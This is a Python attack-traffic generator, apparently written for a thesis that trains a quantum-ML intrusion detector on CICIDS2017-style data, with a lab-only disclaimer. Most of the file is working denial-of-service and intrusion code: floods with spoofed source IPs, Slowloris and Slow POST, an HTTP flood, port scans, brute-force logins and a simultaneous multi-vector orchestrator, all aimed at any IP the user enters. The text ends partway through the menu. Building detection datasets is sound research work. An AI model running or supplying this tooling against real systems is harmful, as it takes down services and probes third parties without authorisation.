#!/usr/bin/env python3
"""
simulador_ataques_v3.py
Simulador de trafico de ataque para generar datasets de entrenamiento del
IDS Cuantico.

Tesis: "Deteccion de anomalias en trafico de red mediante Quantum Machine
Learning: comparacion entre simuladores clasicos y hardware cuantico real"
Alumna: Ticiana Angelucci - Universidad Champagnat - 2026

>>> USO EXCLUSIVO EN LABORATORIO / RED PROPIA Y CONTROLADA <<<
Este script genera trafico de red malicioso REAL (floods, escaneos,
conexiones lentas, intentos de fuerza bruta). Debe ejecutarse unicamente
contra maquinas de tu propiedad o de las que tengas autorizacion expresa
por escrito, dentro de un entorno aislado (VM/lab), tal como se hizo para
construir el dataset original CICIDS2017. Usarlo contra terceros sin
autorizacion es ilegal.

NOVEDADES v3 respecto de v2
----------------------------
1) Nuevos vectores de ataque, alineados a categorias reales de CICIDS2017
   que v2 no cubria (v2 solo tenia SYN flood / UDP flood / ICMP flood):
     - PortScan            -> escanear_puertos()
     - DoS Slowloris        -> dos_slowloris()          (capa 7, baja tasa)
     - DoS Slow POST        -> dos_slow_post()           (estilo slowhttptest)
     - Patator (bruteforce) -> fuerza_bruta_simulada()   (SSH/FTP)
     - DoS Hulk-like        -> http_flood_l7()           (flood HTTP capa 7)

2) Orquestador multi-vector REAL (GestorMultiVector): en v2,
   'ataque_hibrido' ejecutaba las fases (SYN -> UDP -> ICMP) una despues de
   la otra. En v3 las instancias de ataque se lanzan TODAS AL MISMO TIEMPO
   (sincronizadas con threading.Barrier) para producir un patron de trafico
   mas parecido a una campana multi-vector real, y cada instancia corre con
   su propio target/puerto/tasa/duracion independiente.

3) Escenarios reproducibles en JSON (ver escenario_ejemplo_v3.json): permite
   declarar N instancias simultaneas de vectores distintos y volver a correr
   exactamente la misma corrida para regenerar el dataset.

4) Fix de un bug de v2: en GestorAtaquesParalelos, futuro.result(timeout=30)
   estaba fijo en 30s sin importar la duracion configurada, por lo que
   ataques mas largos podian cortarse antes de terminar. En v3 el timeout
   se calcula a partir de la duracion real de cada instancia.
"""

import argparse
import json
import logging
import queue
import random
import socket
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
from concurrent.futures import TimeoutError as FuturesTimeoutError
from datetime import datetime

from scapy.all import IP, TCP, UDP, ICMP, send, RandIP, RandShort


class GeneradorAtaqueAvanzado:
    """Generador de ataques de red con capacidades avanzadas"""

    def __init__(self, config_file=None):
        self.paquetes_enviados = 0
        self.errores = 0
        self.ataques_activos = []
        self.cola_eventos = queue.Queue()
        self.logger = self._configurar_logger()

        # Configuracion por defecto
        self.config = {
            'duracion_base': 10,
            'tasa_base': 100,
            'variabilidad_tasa': 0.3,  # 30% de variacion para simular realismo
            'spoofing_ips': True,
            'puertos_comunes': [80, 443, 53, 22, 8080, 3306, 5432],
        }

        if config_file:
            self.cargar_configuracion(config_file)

    def _configurar_logger(self):
        """Configura logging estructurado para el simulador"""
        logger = logging.getLogger('AtaqueSimulador')
        logger.setLevel(logging.INFO)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def cargar_configuracion(self, archivo):
        """Carga configuracion desde archivo JSON"""
        try:
            with open(archivo, 'r') as f:
                self.config.update(json.load(f))
            self.logger.info(f"Configuracion cargada desde {archivo}")
        except Exception as e:
            self.logger.error(f"Error cargando configuracion: {e}")

    def validar_ip(self, ip):
        """Valida formato de IP"""
        partes = ip.split('.')
        if len(partes) != 4:
            return False
        try:
            return all(0 <= int(p) <= 255 for p in partes)
        except Exception:
            return False

    def _src_ip(self):
        """IP origen: spoofeada o de una red privada, segun configuracion"""
        if self.config.get('spoofing_ips'):
            return RandIP()
        return f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # ------------------------------------------------------------------ #
    # Vectores ya existentes en v2 (sin cambios de comportamiento)
    # ------------------------------------------------------------------ #

    def generar_trafico_fondo(self, target_ip, duracion, intensidad):
        """Genera trafico de fondo realista (clase 'benigno' del dataset)"""
        self.logger.info(f"Generando trafico de fondo hacia {target_ip}")
        tiempo_fin = time.time() + duracion
        contador = 0
        puertos_web = [80, 443, 8080]
        paquetes_por_segundo = intensidad

        try:
            while time.time() < tiempo_fin:
                if random.random() < 0.6:
                    dport = random.choice(puertos_web)
                    payload = f"GET /{random.randint(1, 999)} HTTP/1.1\r\nHost: example.com\r\n\r\n"
                    paquete = IP(dst=target_ip) / TCP(
                        sport=RandShort(), dport=dport, flags='A'
                    ) / payload
                else:
                    paquete = IP(dst=target_ip) / UDP(
                        sport=RandShort(), dport=53
                    ) / random._urandom(random.randint(20, 100))

                send(paquete, verbose=False)
                contador += 1
                time.sleep(1.0 / paquetes_por_segundo)
        except Exception as e:
            self.logger.error(f"Error en trafico de fondo: {e}")

        self.logger.info(f"Trafico de fondo completado: {contador} paquetes")
        return contador

    def tcp_syn_flood_avanzado(self, target_ip, target_port=80, duracion=10,
                                tasa=100, variar_tasa=True, usar_proxies=False):
        """TCP SYN Flood con tasa variable y spoofing (categoria DoS/DDoS)"""
        self.logger.info("INICIANDO TCP SYN FLOOD AVANZADO")
        self.logger.info(f"   Target: {target_ip}:{target_port}")
        self.logger.info(f"   Duracion: {duracion}s | Tasa base: {tasa} pkt/s")

        if not self.validar_ip(target_ip):
            self.logger.error(f"IP invalida: {target_ip}")
            return 0

        if variar_tasa:
            tasa_min, tasa_max = int(tasa * 0.7), int(tasa * 1.3)
        else:
            tasa_min = tasa_max = tasa

        tiempo_fin = time.time() + duracion
        contador = 0
        tasas_usadas = []
        puertos_fuente = list(range(1024, 65535))

        try:
            while time.time() < tiempo_fin:
                tasa_actual = random.randint(max(tasa_min, 1), max(tasa_max, 1))
                intervalo = 1.0 / tasa_actual
                tasas_usadas.append(tasa_actual)

                src_ip = self._src_ip()
                src_port = random.choice(puertos_fuente)

                opciones_tcp = []
                if random.random() < 0.5:
                    opciones_tcp.append(('MSS', 1460))
                if random.random() < 0.3:
                    opciones_tcp.append(('WScale', 7))

                paquete = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=src_port, dport=target_port, flags='S',
                    seq=random.randint(1000, 999999), options=opciones_tcp
                )

                send(paquete, verbose=False)
                contador += 1

                if contador % 500 == 0:
                    tasa_promedio = sum(tasas_usadas[-100:]) / min(100, len(tasas_usadas))
                    self.logger.info(
                        f"   -> Enviados {contador} SYN (tasa actual: {tasa_actual:.0f} pkt/s, prom: {tasa_promedio:.0f})"
                    )

                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("Ataque interrumpido por el usuario")
        except Exception as e:
            self.logger.error(f"Error: {e}")
            self.errores += 1
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"TCP SYN Flood completado. Total paquetes: {contador}")
        return contador

    def udp_flood(self, target_ip, target_port=53, duracion=10, tasa=500):
        """UDP Flood con payloads variables"""
        self.logger.info(f"INICIANDO UDP FLOOD -> {target_ip}:{target_port}")

        if not self.validar_ip(target_ip):
            self.logger.error(f"IP invalida: {target_ip}")
            return 0

        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0
        tamanos_payload = list(range(64, 1024, 64))

        try:
            while time.time() < tiempo_fin:
                src_ip = self._src_ip()
                tamano = random.choice(tamanos_payload)
                payload = random._urandom(tamano)

                paquete = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=RandShort(), dport=target_port
                ) / payload

                send(paquete, verbose=False)
                contador += 1
                if contador % 500 == 0:
                    self.logger.info(f"   -> Enviados {contador} paquetes UDP...")
                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("Ataque interrumpido")
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"UDP Flood completado. Total paquetes: {contador}")
        return contador

    def icmp_flood(self, target_ip, duracion=10, tasa=500):
        """ICMP Flood con variacion de tamanos"""
        self.logger.info(f"INICIANDO ICMP FLOOD -> {target_ip}")

        if not self.validar_ip(target_ip):
            self.logger.error(f"IP invalida: {target_ip}")
            return 0

        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0
        tamanos = list(range(56, 1500, 64))

        try:
            while time.time() < tiempo_fin:
                src_ip = self._src_ip()
                tamano = random.choice(tamanos)
                paquete = IP(src=src_ip, dst=target_ip) / ICMP(
                    type=8, code=0, id=random.randint(1, 65535), seq=contador
                ) / random._urandom(tamano)

                send(paquete, verbose=False)
                contador += 1
                if contador % 500 == 0:
                    self.logger.info(f"   -> Enviados {contador} paquetes ICMP...")
                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("Ataque interrumpido")
        finally:
            self.paquetes_enviados = contador
            self.logger.info(f"ICMP Flood completado. Total paquetes: {contador}")
        return contador

    def ataque_hibrido(self, target_ip, duracion=30, intensidad='media'):
        """Ataque hibrido secuencial (se conserva de v2 por compatibilidad).
        Para trafico realmente simultaneo usar GestorMultiVector."""
        self.logger.info(f"INICIANDO ATAQUE HIBRIDO (secuencial) -> {target_ip}")

        intensidades = {
            'baja': {'tasa': 50, 'factores': 1},
            'media': {'tasa': 150, 'factores': 2},
            'alta': {'tasa': 300, 'factores': 4},
        }
        config = intensidades.get(intensidad, intensidades['media'])

        fase_duracion = duracion / 3
        fases = [
            ('TCP_SYN', 0.5, target_ip, 80),
            ('UDP', 0.3, target_ip, 53),
            ('ICMP', 0.2, target_ip, None),
        ]

        contador_total = 0
        ataques_ejecutados = []

        try:
            for fase, proporcion, ip, puerto in fases:
                tiempo_fase = fase_duracion * proporcion
                if fase == 'TCP_SYN':
                    contador = self.tcp_syn_flood_avanzado(
                        target_ip=ip, target_port=puerto, duracion=tiempo_fase,
                        tasa=config['tasa'] * config['factores']
                    )
                elif fase == 'UDP':
                    contador = self.udp_flood(
                        target_ip=ip, target_port=puerto, duracion=tiempo_fase,
                        tasa=config['tasa'] * 0.5
                    )
                else:
                    contador = self.icmp_flood(
                        target_ip=ip, duracion=tiempo_fase, tasa=config['tasa'] * 0.3
                    )
                contador_total += contador
                ataques_ejecutados.append({'fase': fase, 'paquetes': contador})
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.logger.info("Ataque hibrido interrumpido")
        finally:
            self.logger.info(f"Ataque hibrido completado. Total: {contador_total}")
        return contador_total

    # ------------------------------------------------------------------ #
    # Vectores NUEVOS en v3 (categorias de CICIDS2017 que faltaban)
    # ------------------------------------------------------------------ #

    def escanear_puertos(self, target_ip, puerto_inicio=1, puerto_fin=1024,
                          duracion=None, tasa=50):
        """PortScan (categoria 'PortScan' de CICIDS2017): envia SYN a un
        rango de puertos en orden aleatorio para simular un escaneo."""
        self.logger.info(f"INICIANDO PORT SCAN -> {target_ip}:{puerto_inicio}-{puerto_fin}")

        if not self.validar_ip(target_ip):
            self.logger.error(f"IP invalida: {target_ip}")
            return 0

        puertos = list(range(puerto_inicio, puerto_fin + 1))
        random.shuffle(puertos)
        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion if duracion else None
        contador = 0

        try:
            for puerto in puertos:
                if tiempo_fin and time.time() > tiempo_fin:
                    break
                src_ip = self._src_ip()
                paquete = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=puerto, flags='S',
                    seq=random.randint(1000, 999999)
                )
                send(paquete, verbose=False)
                contador += 1
                if contador % 200 == 0:
                    self.logger.info(f"   -> {contador} puertos escaneados...")
                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("Port scan interrumpido")
        finally:
            self.logger.info(f"Port scan completado. Puertos escaneados: {contador}")
        return contador

    def _abrir_conexiones_paralelo(self, target_ip, target_port, num_conexiones,
                                    timeout_conexion=3, tiempo_max_apertura=None):
        """Abre hasta 'num_conexiones' sockets TCP EN PARALELO (no de a uno).

        Bug corregido en v3.1: dos_slowloris/dos_slow_post abrian las
        conexiones en un for secuencial, cada una con su propio
        socket.settimeout(). Si el target no respondia (IP invalida,
        puerto filtrado, host caido), cada intento consumia su timeout
        completo y la apertura de, por ejemplo, 150 conexiones podia tardar
        150 x 4s = 10 minutos, muy por encima de la 'duracion' pedida y del
        tiempo que el orquestador multi-vector esta dispuesto a esperar.

        Aca las conexiones se intentan todas al mismo tiempo con un
        ThreadPoolExecutor, y se corta la espera a los 'tiempo_max_apertura'
        segundos: lo que ya se conecto se usa, y lo que no respondio a
        tiempo se abandona (sin bloquear al resto del ataque)."""
        if tiempo_max_apertura is None:
            tiempo_max_apertura = min(max(timeout_conexion + 1, 5), 20)

        def _conectar():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_conexion)
                s.connect((target_ip, target_port))
                return s
            except (socket.error, OSError):
                return None

        sockets_abiertos = []
        pool = ThreadPoolExecutor(max_workers=min(100, max(num_conexiones, 1)))
        try:
            futuros = [pool.submit(_conectar) for _ in range(num_conexiones)]
            done, pending = wait(futuros, timeout=tiempo_max_apertura)
            for f in done:
                s = f.result()
                if s is not None:
                    sockets_abiertos.append(s)
            if pending:
                self.logger.info(
                    f"   {len(pending)} intento(s) de conexion no respondieron en "
                    f"{tiempo_max_apertura}s, se descartan (target caido/filtrado?)"
                )
        finally:
            # No esperamos a que terminen los intentos colgados: seguimos
            # con lo que ya tenemos para no arrastrar el resto del ataque.
            pool.shutdown(wait=False, cancel_futures=True)
        return sockets_abiertos

    def dos_slowloris(self, target_ip, target_port=80, duracion=30,
                       num_conexiones=150, intervalo_keepalive=10, timeout_conexion=3):
        """DoS Slowloris (capa 7, baja tasa): abre muchas conexiones TCP
        reales, envia encabezados HTTP incompletos y los mantiene vivos
        enviando encabezados extra cada 'intervalo_keepalive' segundos,
        sin cerrar nunca la peticion. Usa sockets reales porque requiere
        el handshake TCP completo (scapy no sostiene el estado de conexion)."""
        self.logger.info(f"INICIANDO DoS SLOWLORIS -> {target_ip}:{target_port}")
        self.logger.info(f"   Conexiones objetivo: {num_conexiones} | Duracion: {duracion}s")

        tiempo_fin = time.time() + duracion
        paquetes_enviados = 0

        # Abrir las conexiones EN PARALELO, acotado a una fraccion de la
        # duracion total (ver _abrir_conexiones_paralelo). Antes esto era
        # un for secuencial que, contra un target que no respondia, podia
        # tardar num_conexiones x timeout segundos.
        tiempo_max_apertura = min(max(duracion * 0.5, timeout_conexion + 1), 20)
        sockets_abiertos = self._abrir_conexiones_paralelo(
            target_ip, target_port, num_conexiones, timeout_conexion, tiempo_max_apertura)

        try:
            for i, s in enumerate(list(sockets_abiertos)):
                try:
                    s.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
                    s.send(f"User-Agent: sim-slowloris-{i}\r\n".encode())
                    s.send(b"Accept-language: en-US,en,q=0.5\r\n")
                    paquetes_enviados += 1
                except (socket.error, OSError):
                    sockets_abiertos.remove(s)
                    try:
                        s.close()
                    except OSError:
                        pass
                    self.errores += 1

            self.logger.info(f"   Conexiones abiertas: {len(sockets_abiertos)}/{num_conexiones}")

            while time.time() < tiempo_fin and sockets_abiertos:
                for s in list(sockets_abiertos):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        paquetes_enviados += 1
                    except (socket.error, OSError):
                        sockets_abiertos.remove(s)
                        try:
                            s.close()
                        except OSError:
                            pass
                # Dormir el intervalo de keepalive, pero sin pasarnos de
                # 'duracion' (si no, la ultima espera podia extender el
                # ataque bastante mas de lo pedido).
                restante = tiempo_fin - time.time()
                if restante <= 0:
                    break
                time.sleep(min(intervalo_keepalive, restante))
        except KeyboardInterrupt:
            self.logger.info("Slowloris interrumpido")
        finally:
            for s in sockets_abiertos:
                try:
                    s.close()
                except OSError:
                    pass
            self.logger.info(f"Slowloris completado. Paquetes/keepalives enviados: {paquetes_enviados}")
        return paquetes_enviados

    def dos_slow_post(self, target_ip, target_port=80, duracion=30,
                       num_conexiones=50, intervalo=5, timeout_conexion=3):
        """DoS Slow POST (estilo slowhttptest): declara un Content-Length
        grande y envia el cuerpo de a pocos bytes por vez, manteniendo la
        conexion ocupada el mayor tiempo posible."""
        self.logger.info(f"INICIANDO DoS SLOW POST -> {target_ip}:{target_port}")

        tiempo_fin = time.time() + duracion
        paquetes_enviados = 0
        content_length = 10 ** 7  # declarado, nunca se llega a enviar completo

        # Igual que en dos_slowloris: abrir en paralelo y acotado, para que
        # un target que no responde no se coma toda la duracion del ataque
        # abriendo conexiones de a una.
        tiempo_max_apertura = min(max(duracion * 0.5, timeout_conexion + 1), 20)
        sockets_abiertos = self._abrir_conexiones_paralelo(
            target_ip, target_port, num_conexiones, timeout_conexion, tiempo_max_apertura)

        try:
            for s in list(sockets_abiertos):
                try:
                    header = (
                        f"POST /?{random.randint(0, 999999)} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {content_length}\r\n\r\n"
                    )
                    s.send(header.encode())
                    paquetes_enviados += 1
                except (socket.error, OSError):
                    sockets_abiertos.remove(s)
                    try:
                        s.close()
                    except OSError:
                        pass
                    self.errores += 1

            self.logger.info(f"   Conexiones abiertas: {len(sockets_abiertos)}/{num_conexiones}")

            while time.time() < tiempo_fin and sockets_abiertos:
                for s in list(sockets_abiertos):
                    try:
                        s.send(f"{random.randint(0, 9)}".encode())
                        paquetes_enviados += 1
                    except (socket.error, OSError):
                        sockets_abiertos.remove(s)
                        try:
                            s.close()
                        except OSError:
                            pass
                restante = tiempo_fin - time.time()
                if restante <= 0:
                    break
                time.sleep(min(intervalo, restante))
        except KeyboardInterrupt:
            self.logger.info("Slow POST interrumpido")
        finally:
            for s in sockets_abiertos:
                try:
                    s.close()
                except OSError:
                    pass
            self.logger.info(f"Slow POST completado. Fragmentos enviados: {paquetes_enviados}")
        return paquetes_enviados

    def fuerza_bruta_simulada(self, target_ip, target_port=22, servicio='ssh',
                               duracion=20, tasa=5, usuarios=None):
        """Patator / fuerza bruta simulada (SSH o FTP): abre conexiones
        cortas y repetidas enviando credenciales de prueba. Lo que importa
        para el dataset es el PATRON de trafico (muchas conexiones breves
        con intentos de autenticacion), no obtener acceso real; funciona
        incluso si el servicio no existe realmente en el destino."""
        usuarios = usuarios or ['admin', 'root', 'user', 'test', 'ubuntu']
        passwords = ['123456', 'password', 'admin123', 'qwerty', 'letmein']

        self.logger.info(f"INICIANDO FUERZA BRUTA SIMULADA ({servicio.upper()}) -> {target_ip}:{target_port}")

        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0

        try:
            while time.time() < tiempo_fin:
                usuario = random.choice(usuarios)
                clave = random.choice(passwords)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target_ip, target_port))
                    if servicio == 'ftp':
                        try:
                            s.recv(256)
                        except (socket.error, OSError):
                            pass
                        s.send(f"USER {usuario}\r\n".encode())
                        s.send(f"PASS {clave}\r\n".encode())
                    else:  # ssh (u otro servicio orientado a banner)
                        s.send(f"SSH-2.0-sim-patator_{usuario}\r\n".encode())
                    s.close()
                except (socket.error, OSError):
                    self.errores += 1

                contador += 1
                if contador % 20 == 0:
                    self.logger.info(f"   -> {contador} intentos de autenticacion enviados...")
                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("Fuerza bruta interrumpida")
        finally:
            self.logger.info(f"Fuerza bruta completada. Intentos: {contador}")
        return contador

    def http_flood_l7(self, target_ip, target_port=80, duracion=20, tasa=50):
        """DoS Hulk-like: flood de requests HTTP GET completos (capa 7,
        conexiones TCP reales) con URLs, user-agents y referers aleatorios
        en cada request para variar la firma de cada paquete."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        ]

        self.logger.info(f"INICIANDO HTTP FLOOD (Hulk-like) -> {target_ip}:{target_port}")

        intervalo = 1.0 / tasa
        tiempo_fin = time.time() + duracion
        contador = 0

        try:
            while time.time() < tiempo_fin:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target_ip, target_port))
                    req = (
                        f"GET /?{uuid.uuid4().hex[:8]} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Referer: http://{target_ip}/{random.randint(1, 999)}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    s.send(req.encode())
                    try:
                        s.recv(512)
                    except (socket.error, OSError):
                        pass
                    s.close()
                except (socket.error, OSError):
                    self.errores += 1

                contador += 1
                if contador % 200 == 0:
                    self.logger.info(f"   -> {contador} requests HTTP enviados...")
                time.sleep(intervalo)
        except KeyboardInterrupt:
            self.logger.info("HTTP flood interrumpido")
        finally:
            self.logger.info(f"HTTP flood completado. Requests: {contador}")
        return contador


class GestorMultiVector:
    """Orquesta MULTIPLES INSTANCIAS de vectores de ataque EN SIMULTANEO.

    Diferencia clave con v2 (GestorAtaquesParalelos / ataque_hibrido):
    aca todas las instancias se sincronizan con un threading.Barrier y
    arrancan en el mismo instante, cada una con su propio target/puerto/
    tasa/duracion, en vez de ejecutarse en fases secuenciales.
    """

    TIPOS_SOPORTADOS = (
        'tcp_syn', 'udp', 'icmp', 'hibrido',
        'portscan', 'slowloris', 'slow_post', 'bruteforce', 'http_flood',
    )

    def __init__(self, max_trabajadores=8):
        self.max_trabajadores = max_trabajadores
        self.generador = GeneradorAtaqueAvanzado()
        self.resultados = []

    def _duracion_de(self, ataque):
        return ataque.get('duracion', 10)

    def _lanzar(self, ataque, barrera):
        # Todas las instancias esperan aca: arrancan juntas.
        barrera.wait()

        tipo = ataque.get('tipo', 'tcp_syn')
        target_ip = ataque.get('target_ip')
        target_port = ataque.get('target_port', 80)
        duracion = ataque.get('duracion', 10)
        tasa = ataque.get('tasa', 100)

        if tipo == 'tcp_syn':
            resultado = self.generador.tcp_syn_flood_avanzado(
                target_ip, target_port, duracion, tasa, True)
        elif tipo == 'udp':
            resultado = self.generador.udp_flood(target_ip, target_port, duracion, tasa)
        elif tipo == 'icmp':
            resultado = self.generador.icmp_flood(target_ip, duracion, tasa)
        elif tipo == 'hibrido':
            resultado = self.generador.ataque_hibrido(target_ip, duracion, ataque.get('intensidad', 'alta'))
        elif tipo == 'portscan':
            resultado = self.generador.escanear_puertos(
                target_ip, ataque.get('puerto_inicio', 1),
                ataque.get('puerto_fin', 1024), duracion, tasa)
        elif tipo == 'slowloris':
            resultado = self.generador.dos_slowloris(
                target_ip, target_port, duracion, ataque.get('num_conexiones', 150))
        elif tipo == 'slow_post':
            resultado = self.generador.dos_slow_post(
                target_ip, target_port, duracion, ataque.get('num_conexiones', 50))
        elif tipo == 'bruteforce':
            resultado = self.generador.fuerza_bruta_simulada(
                target_ip, target_port, ataque.get('servicio', 'ssh'), duracion, tasa)
        elif tipo == 'http_flood':
            resultado = self.generador.http_flood_l7(target_ip, target_port, duracion, tasa)
        else:
            self.generador.logger.error(f"Tipo de ataque desconocido: {tipo}")
            resultado = 0

        return tipo, resultado

    def ejecutar_multivector(self, lista_ataques):
        """Lanza todas las instancias de 'lista_ataques' EN SIMULTANEO."""
        if not lista_ataques:
            return []

        n = len(lista_ataques)
        barrera = threading.Barrier(n)
        timeout_total = max(self._duracion_de(a) for a in lista_ataques) + 30

        self.generador.logger.info(f"Lanzando {n} instancias de ataque EN SIMULTANEO")
        for i, a in enumerate(lista_ataques):
            self.generador.logger.info(
                f"   {i + 1}. {a.get('tipo')} -> {a.get('target_ip')}:{a.get('target_port', '-')} "
                f"({a.get('duracion', 10)}s, tasa={a.get('tasa', '-')})"
            )

        self.resultados = []
        # OJO: no usamos 'with ThreadPoolExecutor(...) as executor' aca a
        # proposito. Al salir del 'with', Python llama a executor.shutdown
        # (wait=True) y ESO bloquea hasta que terminen TODAS las instancias,
        # incluso si ya decidimos abandonar una que se paso de tiempo. Antes,
        # eso hacia que un TimeoutError de as_completed recien se viera en
        # pantalla varios minutos despues (cuando el 'with' por fin lograba
        # cerrar), y sin manejo de la excepcion tumbaba todo el programa.
        executor = ThreadPoolExecutor(max_workers=max(self.max_trabajadores, n))
        try:
            futuros = {executor.submit(self._lanzar, a, barrera): a for a in lista_ataques}
            try:
                for futuro in as_completed(futuros, timeout=timeout_total):
                    ataque = futuros[futuro]
                    try:
                        tipo, resultado = futuro.result()
                        self.resultados.append({'tipo': tipo, 'paquetes': resultado,
                                                 'target_ip': ataque.get('target_ip')})
                    except Exception as e:
                        self.generador.logger.error(f"Error en instancia {ataque.get('tipo')}: {e}")
            except FuturesTimeoutError:
                pendientes = [futuros[f] for f in futuros if not f.done()]
                self.generador.logger.error(
                    f"{len(pendientes)} instancia(s) no terminaron dentro de los "
                    f"{timeout_total:.0f}s esperados y se abandonan (targets caidos/filtrados, "
                    f"o 'duracion' del escenario poco realista): " +
                    ", ".join(f"{a.get('tipo')}->{a.get('target_ip')}" for a in pendientes)
                )
        finally:
            # wait=False: no nos quedamos colgados esperando a las instancias
            # abandonadas: siguen su curso en segundo plano y se descartan.
            executor.shutdown(wait=False, cancel_futures=True)

        total = sum(r['paquetes'] for r in self.resultados)
        self.generador.logger.info("RESUMEN MULTI-VECTOR")
        self.generador.logger.info(f"   Total paquetes/eventos enviados: {total}")
        self.generador.logger.info(f"   Instancias completadas: {len(self.resultados)}/{n}")
        for r in self.resultados:
            self.generador.logger.info(f"   - {r['tipo']} -> {r['target_ip']}: {r['paquetes']}")
        return self.resultados

    @staticmethod
    def cargar_escenario(archivo_json):
        """Carga un escenario multi-vector desde JSON.
        Formato esperado: {"ataques": [ {tipo, target_ip, target_port,
        duracion, tasa, ...}, ... ] }"""
        with open(archivo_json, 'r') as f:
            data = json.load(f)
        return data.get('ataques', data if isinstance(data, list) else [])


# Alias por compatibilidad con nombres usados en v2
GestorAtaquesParalelos = GestorMultiVector


def _generar_ataques_multivector_ejemplo(ip, n):
    """Arma una lista de N instancias variadas (incluye los vectores nuevos)
    para la opcion de menu 'multivector real'."""
    tipos = list(GestorMultiVector.TIPOS_SOPORTADOS)
    tipos.remove('hibrido')  # el hibrido ya es multi-fase por si solo
    ataques = []
    for _ in range(n):
        tipo = random.choice(tipos)
        ataque = {
            'tipo': tipo,
            'target_ip': ip,
            'duracion': random.randint(8, 15),
            'tasa': random.randint(20, 150),
        }
        if tipo == 'portscan':
            ataque['puerto_inicio'], ataque['puerto_fin'] = 1, 1024
        elif tipo in ('slowloris', 'slow_post'):
            ataque['target_port'] = 80
            ataque['num_conexiones'] = random.randint(30, 100)
        elif tipo == 'bruteforce':
            ataque['target_port'] = 22
            ataque['servicio'] = random.choice(['ssh', 'ftp'])
        elif tipo == 'http_flood':
            ataque['target_port'] = 80
        else:
            ataque['target_port'] = random.choice([80, 443, 53, 22, 8080])
        ataques.append(ataque)
    return ataques


def menu_avanzado():
    """Menu interactivo v3"""
    generador = GeneradorAtaqueAvanzado()
    gestor = GestorMultiVector(max_trabajadores=8)

    print("\n" + "=" * 60)
    print("SIMULADOR DE ATAQUES v3 - IDS CUANTICO (uso en laboratorio)")
    print("=" * 60)

    while True:
        print("\n" + "=" * 60)
        print("MENU PRINCIPAL")
        print("=" * 60)
        print(" 1. TCP SYN Flood Avanzado")
        print(" 2. UDP Flood")
        print(" 3. ICMP Flood")
        print(" 4. Ataque Hibrido (secuencial, v2)")
        print(" 5. Port Scan                 [nuevo v3]")
        print(" 6. DoS Slowloris             [nuevo v3]")
        print(" 7. DoS Slow POST             [nuevo v3]")
        print(" 8. Fuerza bruta simulada     [nuevo v3]")
        print(" 9. HTTP Flood (Hulk-like)    [nuevo v3]")
        print("10. Multi-vector SIMULTANEO (auto)      [nuevo v3]")
        print("11. Multi-vector SIMULTANEO desde JSON  [nuevo v3]")
        print("12. Generar Trafico de Fondo")
        print("13. Configurar Parametros")
        print("14. Salir")

        opcion = input("\nSelecciona una opcion (1-14): ").strip()

        if opcion == '1':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 80): ") or "80"
            duracion = input("Duracion en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 100): ") or "100"
            generador.tcp_syn_flood_avanzado(ip, int(puerto), int(duracion), int(tasa), True)

        elif opcion == '2':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 53): ") or "53"
            duracion = input("Duracion en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 500): ") or "500"
            generador.udp_flood(ip, int(puerto), int(duracion), int(tasa))

        elif opcion == '3':
            ip = input("IP objetivo: ")
            duracion = input("Duracion en segundos (default 10): ") or "10"
            tasa = input("Paquetes por segundo (default 500): ") or "500"
            generador.icmp_flood(ip, int(duracion), int(tasa))

        elif opcion == '4':
            ip = input("IP objetivo: ")
            duracion = input("Duracion en segundos (default 30): ") or "30"
            intensidad = input("Intensidad (baja/media/alta): ") or "media"
            generador.ataque_hibrido(ip, int(duracion), intensidad)

        elif opcion == '5':
            ip = input("IP objetivo: ")
            p_ini = input("Puerto inicial (default 1): ") or "1"
            p_fin = input("Puerto final (default 1024): ") or "1024"
            duracion = input("Duracion en segundos (vacio = hasta terminar el rango): ")
            tasa = input("Puertos por segundo (default 50): ") or "50"
            generador.escanear_puertos(ip, int(p_ini), int(p_fin),
                                        int(duracion) if duracion else None, int(tasa))

        elif opcion == '6':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 80): ") or "80"
            duracion = input("Duracion en segundos (default 30): ") or "30"
            n_con = input("Numero de conexiones (default 150): ") or "150"
            generador.dos_slowloris(ip, int(puerto), int(duracion), int(n_con))

